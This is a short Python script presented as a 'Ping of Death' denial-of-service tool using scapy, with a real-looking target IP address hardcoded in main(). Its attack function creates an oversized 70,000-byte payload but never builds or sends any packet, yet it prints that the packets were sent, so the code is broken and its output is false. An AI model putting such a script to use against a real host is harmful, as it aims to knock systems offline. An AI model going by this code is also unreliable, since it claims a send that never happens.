#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
Description:
    Ping of Death
    Using scapy library
"""

from scapy.all import IP, ICMP, send

class Style:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    CYAN = '\033[36m'
    RESET = '\033[0m'

style = Style()

def send_pod_attack(target_ip):
    """
    Send fragmented ICMP packets to simulate Ping of Death (PoD).
    """
    try:
        # create an oversize paylaod
        # payload that larger than the maximum size
        oversize_payload = b"A" * 70000

        print(style.GREEN + f"Ping of death packets send to {target_ip}" + style.RESET)

    except Exception as e:
        print(style.RED + f"[-]ERROR: {e}" + style.RESET)

def main():
    target_ip = "162.210.97.174"

    send_pod_attack(target_ip)
    
if __name__ == "__main__":
    main()

